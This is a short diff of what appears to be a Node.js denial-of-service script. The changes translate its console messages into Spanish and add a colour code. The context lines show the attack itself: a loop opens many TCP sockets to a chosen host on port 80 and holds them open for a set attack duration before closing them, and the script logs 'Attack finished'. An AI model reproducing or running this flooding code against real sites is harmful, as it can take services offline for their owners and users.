@@ -47,10 +47,10 @@ const sockets = [];
 for (let i = 0; i < numConnections; i++) {
 const socket = new net.Socket();
 socket.connect(80, url, () => {
-console.log(`Connected to ${url}`);
+console.log(`[31m Conectado a ${url}`);
 });
 socket.on('data', (data) => {
-console.log(`Received data from ${url}`);
+console.log(`Dato recibido de ${url}`);
 });
 socket.on('error', (err) => {
 console.error(`Error: ${err}`);
@@ -59,7 +59,7 @@ sockets.push(socket);
 }
 
 setTimeout(() => {
-console.log('Attack finished');
+console.log('Ataque finalizado');
 sockets.forEach((socket) => socket.destroy());
 }, attackDuration * 1000);
 } catch (error) {
